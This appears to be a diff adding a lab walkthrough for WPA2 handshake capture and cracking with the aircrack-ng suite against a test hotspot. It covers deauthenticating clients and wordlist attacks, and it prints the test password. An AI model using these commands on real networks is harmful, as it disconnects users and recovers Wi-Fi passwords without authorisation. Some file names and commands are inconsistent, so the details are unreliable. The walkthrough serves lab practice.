@@ -1,0 +1,163 @@
+I have updated the file to the following:
+```
+Test Access Point:  Oneplus9
+Security:           WPA2-PSK
+Channel:            11
+Password:           m32y37af
+
+Attacker System:    Kali Linux
+Wireless Adapter:   Alfa AWUS036NH
+Interface:          wlan1
+
+==================================================
+1. Identify Wireless Interfaces
+==================================================
+- List available wireless interfaces.
+
+- Command:
+ifconfig
+
+- Result:
+wlan1
+
+
+==================================================
+2. Enable Monitor Mode
+==================================================
+- Enable monitor mode on the wireless adapter.
+
+- Command:
+sudo airmon-ng start wlan1
+
+- Result:
+Monitor interface created.
+
+- Example:
+wlan1mon
+
+
+==================================================
+3. Discover Wireless Networks
+==================================================
+- Scan nearby wireless networks.
+
+- Command:
+sudo airodump-ng wlan1mon
+
+
+- Important information to record:
+BSSID
+Channel
+Encryption
+SSID
+
+- Example:
+BSSID:    2A:83:23:87:35:0F
+Channel:  11
+SSID:     Oneplus9
+
+
+==================================================
+4. Capture Authentication Exchange
+==================================================
+- Focus capture on the target access point.
+
+- Command:
+sudo airodump-ng -c <CH> --bssid <BSSID> -w capture wlan1mon
+
+- Example:
+sudo airodump-ng -c 11 --bssid 2A:83:23:87:35:0F -w capture wlan1mon
+
+- Result:
+capture-01.cap
+capture-01.csv
+
+
+==================================================
+5. Trigger Client Reconnection (Deauthenticate)
+==================================================
+- Disconnect the device to force a reconnection so the authentication exchange is captured.
+
+- Command:
+sudo aireplay-ng --deauth <Attack Count> -a <BSSID> -c <STATION> <NIC>
+
+- Example:
+sudo aireplay-ng --deauth 20 -a 2A:83:23:87:35:0F -c F0:9E:4A:7C:8F:5D wlan1mon
+
+- When the device reconnects, verify the capture window shows:
+WPA handshake: AA:BB:CC:DD:EE:FF
+
+
+==================================================
+6. Verify Capture File
+==================================================
+- Before password auditing, verify the capture file contains the authentication exchange.
+
+- Command:
+aircrack-ng Oneplus9.cap
+
+- Expected output example:
+1 handshake detected
+
+
+==================================================
+7. Password Auditing
+==================================================
+- Attempt password recovery using a wordlist.
+
+- Command:
+sudo aircrack-ng -w wordlist.txt -b <BSSID> capture-01.cap
+
+
+- Example:
+sudo aircrack-ng -w ~/Documents/own_wordlist.txt -b 2A:83:23:87:35:0F Oneplus9-01.cap
+
+- Result:
+If the password exists in the wordlist, the tool will display it.
+
+
+==================================================
+8. Wordlist Strategies
+==================================================
+- Common sources for lab wordlists:
+    Language dictionaries
+    Custom lists
+    Rule-based mutations
+    Targeted password patterns
+
+- Example wordlist locations:
+    /usr/share/wordlists/
+    ~/Documents/wordlists/
+
+
+==================================================
+9. Troubleshooting
+==================================================
+- Common issues:
+1. Wireless adapter does not support monitor mode
+2. Wireless adapter does not support packet injection
+3. Wrong channel selected
+4. No client activity on the network
+5. Capture file missing authentication exchange
+
+
+==================================================
+10. Stop Monitor Mode
+==================================================
+- Disable monitor mode.
+
+- Command:
+sudo airmon-ng stop wlan1mon
+
+
+==================================================
+11. Restore Network Connectivity
+==================================================
+- Restart networking services if required.
+
+- Commands:
+sudo ifconfig wlan1 up
+sudo NetworkManager restart
+
+- Verify connectivity:
+ping google.com
